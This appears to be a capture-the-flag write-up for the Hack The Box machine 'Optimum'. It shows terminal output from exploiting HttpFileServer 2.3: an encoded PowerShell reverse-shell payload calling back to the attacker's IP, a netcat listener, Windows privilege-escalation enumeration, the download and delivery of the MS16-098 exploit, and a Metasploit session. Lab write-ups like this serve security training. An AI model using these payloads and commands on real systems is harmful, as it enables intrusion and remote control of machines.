+</code></pre><figure id="127d1b9f-8847-80ca-98ce-cdf512a648d4" class="image"><a href="../img/OPTIMUM/image 1.png"><img style="width:707.96875px" src="../img/OPTIMUM/image 1.png"/></a></figure><h2 id="127d1b9f-8847-8009-973a-ca6bfaf40b67" class="">Findings</h2><ul id="127d1b9f-8847-80ee-84d2-f3c4d736d670" class="bulleted-list"><li style="list-style-type:disc">HttpFileServer 2.3</li></ul><p id="127d1b9f-8847-8025-b172-cef768332854" class="">
+</p><p id="127d1b9f-8847-801f-9f2e-c33fbc4578aa" class="">
+</p><p id="127d1b9f-8847-8062-9134-c276ee9a6ef4" class="">
+</p><p id="127d1b9f-8847-8060-aa28-fed6f2c59b78" class="">
+</p><h1 id="127d1b9f-8847-80d7-91c9-c7633b0023d1" class="">User</h1><p id="127d1b9f-8847-809e-a53b-f75cab55f243" class="">HttpFileServer 2.3 <a href="https://www.exploit-db.com/exploits/49584">exploit</a></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="127d1b9f-8847-80ad-a77d-fe1376993f3a" class="code"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Escritorio/.htb]
+└─$ python optimum.py         
+
+Encoded the command in base64 format...
+
+Encoded the payload and sent a HTTP GET request to the target...
+
+Printing some information for debugging...
+lhost:  10.10.14.2
+lport:  1205
+rhost:  10.10.10.8
+rport:  80
+payload:  exec|powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMgAiACwAMQAyADAANQApADsAIAAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwAgAFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAIAB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAMAAsACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACAAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAkAGkAKQA7ACAAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAIAAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAEcAZQB0AC0ATABvAGMAYQB0AGkAbwBuACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAgACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAIAAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAIAAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAIAAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=
+
+Listening for connection...
+</code></pre><p id="127d1b9f-8847-8012-bfa6-e9c41d7de309" class="">
+</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="127d1b9f-8847-8016-b7f3-dfd204e2f84c" class="code"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Escritorio/.htb]
+└─$ nc -lnvp 1205    
+listening on [any] 1205 ...
+connect to [10.10.14.2] from (UNKNOWN) [10.10.10.8] 49158
+id
+PS C:\Users\kostas\Desktop&gt; dir
+
+
+    Directory: C:\Users\kostas\Desktop
+
+
+Mode                LastWriteTime     Length Name                                                                      
+----                -------------     ------ ----                                                                      
+-a---         18/3/2017   2:11 ??     760320 hfs.exe                                                                   
+-ar--        28/10/2024   1:01 ??         34 user.txt                                                                  
+
+
+PS C:\Users\kostas\Desktop&gt; type user.txt
+f*******************************7
+</code></pre><h1 id="127d1b9f-8847-80f1-bbde-ecc60ced65eb" class="">Root</h1><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="127d1b9f-8847-80ee-a5a8-cfe74c4fd038" class="code"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all">PS C:\Users\kostas\Desktop&gt; whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State   
+============================= ============================== ========
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
+</code></pre><p id="127d1b9f-8847-8035-8f51-fda8b83f2313" class="">Use WinPeas</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="127d1b9f-8847-80fa-a0b6-f19a75ce286d" class="code"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all">powershell -c wget http://10.10.14.2:8000/winpeas.exe -Outfile winpeas.exe
+
+
+???????????? LSA Protection
+? If enabled, a driver is needed to read LSASS memory (If Secure Boot or UEFI, RunAsPPL cannot be disabled by deleting the registry key) https://book.hacktricks.xyz/windows/stealing-credentials/credentials-protections#lsa-protection
+    LSA Protection is not enabled
+
+???????????? Credentials Guard
+? If enabled, a driver is needed to read LSASS memory https://book.hacktricks.xyz/windows/stealing-credentials/credentials-protections#credential-guard
+    CredentialGuard is not enabled
+
+ Folder: C:\Users\kostas\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+    FolderPerms: kostas [AllAccess]
+    File: C:\Users\kostas\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\desktop.ini (Unquoted and Space detected)
+    FilePerms: kostas [AllAccess]
+   =================================================================================================
+
+
+    Folder: C:\Users\kostas\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+    FolderPerms: kostas [AllAccess]
+    File: C:\Users\kostas\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\hfs - Shortcut.lnk (Unquoted and Space detected)
+    FilePerms: kostas [AllAccess]
+   =================================================================================================
+
+
+    Folder: C:\windows\tasks
+    FolderPerms: Authenticated Users [WriteData/CreateFiles]
+   =================================================================================================
+
+
+    Folder: C:\windows\system32\tasks
+    FolderPerms: Authenticated Users [WriteData/CreateFiles]
+</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="127d1b9f-8847-807e-aa94-dc5107a489db" class="code"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all">PS C:\windows\tasks&gt; systeminfo
+
+Host Name:                 OPTIMUM
+OS Name:                   Microsoft Windows Server 2012 R2 Standard
+OS Version:                6.3.9600 N/A Build 9600
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Standalone Server
+OS Build Type:             Multiprocessor Free
+Registered Owner:          Windows User
+Registered Organization:   
+Product ID:                00252-70000-00000-AA535
+Original Install Date:     18/3/2017, 1:51:36 ??
+System Boot Time:          28/10/2024, 1:00:48 ??
+System Manufacturer:       VMware, Inc.
+System Model:              VMware Virtual Platform
+System Type:               x64-based PC
+Processor(s):              1 Processor(s) Installed.
+                           [01]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2445 Mhz
+BIOS Version:              Phoenix Technologies LTD 6.00, 12/11/2020
+Windows Directory:         C:\Windows
+System Directory:          C:\Windows\system32
+Boot Device:               \Device\HarddiskVolume1
+System Locale:             el;Greek
+Input Locale:              en-us;English (United States)
+Time Zone:                 (UTC+02:00) Athens, Bucharest
+Total Physical Memory:     4.095 MB
+Available Physical Memory: 3.449 MB
+Virtual Memory: Max Size:  5.503 MB
+Virtual Memory: Available: 4.890 MB
+Virtual Memory: In Use:    613 MB
+Page File Location(s):     C:\pagefile.sys
+Domain:                    HTB
+Logon Server:              \\OPTIMUM
+Hotfix(s):                 31 Hotfix(s) Installed.
+                           [01]: KB2959936
+                           [02]: KB2896496
+                           [03]: KB2919355
+                           [04]: KB2920189
+                           [05]: KB2928120
+                           [06]: KB2931358
+                           [07]: KB2931366
+                           [08]: KB2933826
+                           [09]: KB2938772
+                           [10]: KB2949621
+                           [11]: KB2954879
+                           [12]: KB2958262
+                           [13]: KB2958263
+                           [14]: KB2961072
+                           [15]: KB2965500
+                           [16]: KB2966407
+                           [17]: KB2967917
+                           [18]: KB2971203
+                           [19]: KB2971850
+                           [20]: KB2973351
+                           [21]: KB2973448
+                           [22]: KB2975061
+                           [23]: KB2976627
+                           [24]: KB2977629
+                           [25]: KB2981580
+                           [26]: KB2987107
+                           [27]: KB2989647
+                           [28]: KB2998527
+                           [29]: KB3000850
+                           [30]: KB3003057
+                           [31]: KB3014442
+Network Card(s):           1 NIC(s) Installed.
+                           [01]: Intel(R) 82574L Gigabit Network Connection
+                                 Connection Name: Ethernet0
+                                 DHCP Enabled:    No
+                                 IP address(es)
+                                 [01]: 10.10.10.8
+Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
+</code></pre><p id="127d1b9f-8847-80f8-911a-c87e6149b29a" class="">Paste this systeminfo on systeminfo.txt on Kali</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="127d1b9f-8847-800e-8f5a-eac3c1983f39" class="code"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Escritorio/.htb]
+└─$ wget https://raw.githubusercontent.com/Pwnistry/Windows-Exploit-Suggester-python3/refs/heads/master/windows-exploit-suggester.py
+--2024-10-21 22:36:33--  https://raw.githubusercontent.com/Pwnistry/Windows-Exploit-Suggester-python3/refs/heads/master/windows-exploit-suggester.py
+Resolviendo raw.githubusercontent.com (raw.githubusercontent.com)... 2606:50c0:8001::154, 2606:50c0:8002::154, 2606:50c0:8003::154, ...
+Conectando con raw.githubusercontent.com (raw.githubusercontent.com)[2606:50c0:8001::154]:443... conectado.
+Petición HTTP enviada, esperando respuesta... 200 OK
+Longitud: 69991 (68K) [text/plain]
+Grabando a: «windows-exploit-suggester.py»
+
+windows-exploit-suggester.py 100%[=============================================&gt;]  68,35K  --.-KB/s    en 0,002s  
+
+2024-10-21 22:36:33 (37,8 MB/s) - «windows-exploit-suggester.py» guardado [69991/69991]
+
+                                                                                                                   
+┌──(drroot㉿drroot)-[~/Escritorio/.htb]
+└─$ python windows-exploit-suggester.py --update
+[*]
+initiating winsploit version 3.4...
+[+]
+writing to file 2024-10-21-mssb.xlsx
+[*]
+done
+                                                                                                                   
+┌──(drroot㉿drroot)-[~/Escritorio/.htb]
+└─$ nano systeminfo.txt      
+                                                                                                                   
+┌──(drroot㉿drroot)-[~/Escritorio/.htb]
+└─$ python windows-exploit-suggester.py --systeminfo systeminfo.txt --database 2024-10-21-mssb.xlsx
+
+┌──(drroot㉿drroot)-[~/Escritorio/.htb]
+└─$ python windows-exploit-suggester.py --systeminfo systeminfo.txt --database 2024-10-21-mssb.xlsx   
+[*]
+initiating winsploit version 3.4...
+[*]
+database file detected as xlsx based on extension
+[*]
+attempting to read from the systeminfo input file
+[+]
+systeminfo input file read successfully (utf-8)
+[*]
+querying database file for potential vulnerabilities
+[*]
+comparing the 32 hotfix(es) against the 266 potential bulletins(s) with a database of 137 known exploits
+[*]
+there are now 246 remaining vulns
+[+]
+[E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
+[+]
+windows version identified as &#x27;Windows 2012 R2 64-bit&#x27;
+[*]
+
+[E]
+MS16-135: Security Update for Windows Kernel-Mode Drivers (3199135) - Important
+[*]
+  https://www.exploit-db.com/exploits/40745/ -- Microsoft Windows Kernel - win32k Denial of Service (MS16-135)
+[*]
+  https://www.exploit-db.com/exploits/41015/ -- Microsoft Windows Kernel - &#x27;win32k.sys&#x27; &#x27;NtSetWindowLongPtr&#x27; Privilege Escalation (MS16-135) (2)
+[*]
+  https://github.com/tinysec/public/tree/master/CVE-2016-7255
+[*]
+
+[E]
+MS16-098: Security Update for Windows Kernel-Mode Drivers (3178466) - Important
+[*]
+  https://www.exploit-db.com/exploits/41020/ -- Microsoft Windows 8.1 (x64) - RGNOBJ Integer Overflow (MS16-098)
+[*]
+
+[M]
+MS16-075: Security Update for Windows SMB Server (3164038) - Important
+[*]
+  https://github.com/foxglovesec/RottenPotato
+[*]
+  https://github.com/Kevin-Robertson/Tater
+[*]
+  https://bugs.chromium.org/p/project-zero/issues/detail?id=222 -- Windows: Local WebDAV NTLM Reflection Elevation of Privilege
+[*]
+  https://foxglovesecurity.com/2016/01/16/hot-potato/ -- Hot Potato - Windows Privilege Escalation
+[*]
+
+[E]
+MS16-074: Security Update for Microsoft Graphics Component (3164036) - Important
+[*]
+  https://www.exploit-db.com/exploits/39990/ -- Windows - gdi32.dll Multiple DIB-Related EMF Record Handlers Heap-Based Out-of-Bounds Reads/Memory Disclosure (MS16-074), PoC
+[*]
+  https://www.exploit-db.com/exploits/39991/ -- Windows Kernel - ATMFD.DLL NamedEscape 0x250C Pool Corruption (MS16-074), PoC
+[*]
+
+[E]
+MS16-063: Cumulative Security Update for Internet Explorer (3163649) - Critical
+[*]
+  https://www.exploit-db.com/exploits/39994/ -- Internet Explorer 11 - Garbage Collector Attribute Type Confusion (MS16-063), PoC
+[*]
+
+[E]
+MS16-032: Security Update for Secondary Logon to Address Elevation of Privile (3143141) - Important
+[*]
+  https://www.exploit-db.com/exploits/40107/ -- MS16-032 Secondary Logon Handle Privilege Escalation, MSF
+[*]
+  https://www.exploit-db.com/exploits/39574/ -- Microsoft Windows 8.1/10 - Secondary Logon Standard Handles Missing Sanitization Privilege Escalation (MS16-032), PoC
+[*]
+  https://www.exploit-db.com/exploits/39719/ -- Microsoft Windows 7-10 &amp; Server 2008-2012 (x32/x64) - Local Privilege Escalation (MS16-032) (PowerShell), PoC
+[*]
+  https://www.exploit-db.com/exploits/39809/ -- Microsoft Windows 7-10 &amp; Server 2008-2012 (x32/x64) - Local Privilege Escalation (MS16-032) (C#)
+[*]
+
+[M]
+MS16-016: Security Update for WebDAV to Address Elevation of Privilege (3136041) - Important
+[*]
+  https://www.exploit-db.com/exploits/40085/ -- MS16-016 mrxdav.sys WebDav Local Privilege Escalation, MSF
+[*]
+  https://www.exploit-db.com/exploits/39788/ -- Microsoft Windows 7 - WebDAV Privilege Escalation Exploit (MS16-016) (2), PoC
+[*]
+  https://www.exploit-db.com/exploits/39432/ -- Microsoft Windows 7 SP1 x86 - WebDAV Privilege Escalation (MS16-016) (1), PoC
+[*]
+
+[E]
+MS16-014: Security Update for Microsoft Windows to Address Remote Code Execution (3134228) - Important
+[*]
+  Windows 7 SP1 x86 - Privilege Escalation (MS16-014), https://www.exploit-db.com/exploits/40039/, PoC
+[*]
+
+[E]
+MS16-007: Security Update for Microsoft Windows to Address Remote Code Execution (3124901) - Important
+[*]
+  https://www.exploit-db.com/exploits/39232/ -- Microsoft Windows devenum.dll!DeviceMoniker::Load() - Heap Corruption Buffer Underflow (MS16-007), PoC
+[*]
+  https://www.exploit-db.com/exploits/39233/ -- Microsoft Office / COM Object DLL Planting with WMALFXGFXDSP.dll (MS-16-007), PoC
+[*]
+
+[E]
+MS15-132: Security Update for Microsoft Windows to Address Remote Code Execution (3116162) - Important
+[*]
+  https://www.exploit-db.com/exploits/38968/ -- Microsoft Office / COM Object DLL Planting with comsvcs.dll Delay Load of mqrt.dll (MS15-132), PoC
+[*]
+  https://www.exploit-db.com/exploits/38918/ -- Microsoft Office / COM Object els.dll DLL Planting (MS15-134), PoC
+[*]
+
+[E]
+MS15-112: Cumulative Security Update for Internet Explorer (3104517) - Critical
+[*]
+  https://www.exploit-db.com/exploits/39698/ -- Internet Explorer 9/10/11 - CDOMStringDataList::InitFromString Out-of-Bounds Read (MS15-112)
+[*]
+
+[E]
+MS15-111: Security Update for Windows Kernel to Address Elevation of Privilege (3096447) - Important
+[*]
+  https://www.exploit-db.com/exploits/38474/ -- Windows 10 Sandboxed Mount Reparse Point Creation Mitigation Bypass (MS15-111), PoC
+[*]
+
+[E]
+MS15-102: Vulnerabilities in Windows Task Management Could Allow Elevation of Privilege (3089657) - Important
+[*]
+  https://www.exploit-db.com/exploits/38202/ -- Windows CreateObjectTask SettingsSyncDiagnostics Privilege Escalation, PoC
+[*]
+  https://www.exploit-db.com/exploits/38200/ -- Windows Task Scheduler DeleteExpiredTaskAfter File Deletion Privilege Escalation, PoC
+[*]
+  https://www.exploit-db.com/exploits/38201/ -- Windows CreateObjectTask TileUserBroker Privilege Escalation, PoC
+[*]
+
+[E]
+MS15-097: Vulnerabilities in Microsoft Graphics Component Could Allow Remote Code Execution (3089656) - Critical
+[*]
+  https://www.exploit-db.com/exploits/38198/ -- Windows 10 Build 10130 - User Mode Font Driver Thread Permissions Privilege Escalation, PoC
+[*]
+  https://www.exploit-db.com/exploits/38199/ -- Windows NtUserGetClipboardAccessToken Token Leak, PoC
+[*]
+
+[M]
+MS15-078: Vulnerability in Microsoft Font Driver Could Allow Remote Code Execution (3079904) - Critical
+[*]
+  https://www.exploit-db.com/exploits/38222/ -- MS15-078 Microsoft Windows Font Driver Buffer Overflow
+[*]
+
+[E]
+MS15-052: Vulnerability in Windows Kernel Could Allow Security Feature Bypass (3050514) - Important
+[*]
+  https://www.exploit-db.com/exploits/37052/ -- Windows - CNG.SYS Kernel Security Feature Bypass PoC (MS15-052), PoC
+[*]
+
+[M]
+MS15-051: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (3057191) - Important
+[*]
+  https://github.com/hfiref0x/CVE-2015-1701, Win32k Elevation of Privilege Vulnerability, PoC
+[*]
+  https://www.exploit-db.com/exploits/37367/ -- Windows ClientCopyImage Win32k Exploit, MSF
+[*]
+
+[E]
+MS15-010: Vulnerabilities in Windows Kernel-Mode Driver Could Allow Remote Code Execution (3036220) - Critical
+[*]
+  https://www.exploit-db.com/exploits/39035/ -- Microsoft Windows 8.1 - win32k Local Privilege Escalation (MS15-010), PoC
+[*]
+  https://www.exploit-db.com/exploits/37098/ -- Microsoft Windows - Local Privilege Escalation (MS15-010), PoC
+[*]
+  https://www.exploit-db.com/exploits/39035/ -- Microsoft Windows win32k Local Privilege Escalation (MS15-010), PoC
+[*]
+
+[E]
+MS15-001: Vulnerability in Windows Application Compatibility Cache Could Allow Elevation of Privilege (3023266) - Important
+[*]
+  http://www.exploit-db.com/exploits/35661/ -- Windows 8.1 (32/64 bit) - Privilege Escalation (ahcache.sys/NtApphelpCacheControl), PoC
+[*]
+
+[E]
+MS14-068: Vulnerability in Kerberos Could Allow Elevation of Privilege (3011780) - Critical
+[*]
+  http://www.exploit-db.com/exploits/35474/ -- Windows Kerberos - Elevation of Privilege (MS14-068), PoC
+[*]
+
+[M]
+MS14-064: Vulnerabilities in Windows OLE Could Allow Remote Code Execution (3011443) - Critical
+[*]
+  https://www.exploit-db.com/exploits/37800// -- Microsoft Windows HTA (HTML Application) - Remote Code Execution (MS14-064), PoC
+[*]
+  http://www.exploit-db.com/exploits/35308/ -- Internet Explorer OLE Pre-IE11 - Automation Array Remote Code Execution / Powershell VirtualAlloc (MS14-064), PoC
+[*]
+  http://www.exploit-db.com/exploits/35229/ -- Internet Explorer &lt;= 11 - OLE Automation Array Remote Code Execution (#1), PoC
+[*]
+  http://www.exploit-db.com/exploits/35230/ -- Internet Explorer &lt; 11 - OLE Automation Array Remote Code Execution (MSF), MSF
+[*]
+  http://www.exploit-db.com/exploits/35235/ -- MS14-064 Microsoft Windows OLE Package Manager Code Execution Through Python, MSF
+[*]
+  http://www.exploit-db.com/exploits/35236/ -- MS14-064 Microsoft Windows OLE Package Manager Code Execution, MSF
+[*]
+
+[M]
+MS14-060: Vulnerability in Windows OLE Could Allow Remote Code Execution (3000869) - Important
+[*]
+  http://www.exploit-db.com/exploits/35055/ -- Windows OLE - Remote Code Execution &#x27;Sandworm&#x27; Exploit (MS14-060), PoC
+[*]
+  http://www.exploit-db.com/exploits/35020/ -- MS14-060 Microsoft Windows OLE Package Manager Code Execution, MSF
+[*]
+
+[M]
+MS14-058: Vulnerabilities in Kernel-Mode Driver Could Allow Remote Code Execution (3000061) - Critical
+[*]
+  http://www.exploit-db.com/exploits/35101/ -- Windows TrackPopupMenu Win32k NULL Pointer Dereference, MSF
+[*]
+
+[E]
+MS13-101: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (2880430) - Important
+[M]
+MS13-090: Cumulative Security Update of ActiveX Kill Bits (2900986) - Critical
+[*]
+done
+</code></pre><p id="127d1b9f-8847-8095-908d-e524bd301997" class="">This machine is vulnerable to <a href="https://www.exploit-db.com/exploits/41020">MS16-098</a></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="127d1b9f-8847-8051-9990-e48d5e446e06" class="code"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Escritorio/.htb]
+└─$ wget https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/41020.exe                                 
+--2024-10-21 22:59:03--  https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/41020.exe
+Resolviendo gitlab.com (gitlab.com)... 2606:4700:90:0:f22e:fbec:5bed:a9b9, 172.65.251.78
+Conectando con gitlab.com (gitlab.com)[2606:4700:90:0:f22e:fbec:5bed:a9b9]:443... conectado.
+Petición HTTP enviada, esperando respuesta... 200 OK
+Longitud: 560128 (547K) [application/octet-stream]
+Grabando a: «41020.exe»
+
+41020.exe                                    100%[============================================================================================&gt;] 547,00K  3,36MB/s    en 0,2s    
+
+2024-10-21 22:59:03 (3,36 MB/s) - «41020.exe» guardado [560128/560128]
+
+                                                                                                                                                                                                                                     
+┌──(drroot㉿drroot)-[~/Escritorio/.htb]
+└─$ python -m http.server 8000                                                                      
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+
+
+powershell -c wget http://10.10.14.2:8000/41020.exe -Outfile 41020.exe
+</code></pre><p id="127d1b9f-8847-80da-bad5-fdef092a4d53" class="">Try with meterpreter to execute it!</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="127d1b9f-8847-80ce-a771-f47a164d69a5" class="code"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all">msf6 exploit(windows/http/rejetto_hfs_exec) &gt; exploit
+
+[*] Started reverse TCP handler on 10.10.14.2:1205 
+[*] Using URL: http://10.10.14.2:8080/hHSRzdRReny
+[*] Server started.
+[*] Sending a malicious request to /
+[*] Payload request received: /hHSRzdRReny
+[*] Sending stage (176198 bytes) to 10.10.10.8
+[!] Tried to delete %TEMP%\EzfgercG.vbs, unknown result
+[*] Meterpreter session 1 opened (10.10.14.2:1205 -&gt; 10.10.10.8:49192) at 2024-10-21 23:20:19 -0500
+[*] Server stopped.
+
+meterpreter &gt; ls
+Listing: C:\Users\kostas\Desktop
+================================
+
+Mode              Size     Type  Last modified              Name
+----              ----     ----  -------------              ----
+040777/rwxrwxrwx  0        dir   2024-10-28 08:18:22 -0500  %TEMP%
+100777/rwxrwxrwx  560128   fil   2024-10-28 07:59:27 -0500  41020.exe
+100666/rw-rw-rw-  25798    fil   2024-10-28 08:14:21 -0500  MS16-135.ps1
+100666/rw-rw-rw-  182339   fil   2024-10-28 06:40:52 -0500  PrivescCheck.ps1
+100666/rw-rw-rw-  144080   fil   2024-10-28 06:47:32 -0500  PrivescCheck_OPTIMUM.html
+100666/rw-rw-rw-  163198   fil   2024-10-28 06:47:32 -0500  PrivescCheck_OPTIMUM.txt
+100666/rw-rw-rw-  282      fil   2017-03-18 06:57:16 -0500  desktop.ini
+100777/rwxrwxrwx  760320   fil   2017-03-18 07:11:17 -0500  hfs.exe
+100444/r--r--r--  34       fil   2024-10-28 06:01:42 -0500  user.txt
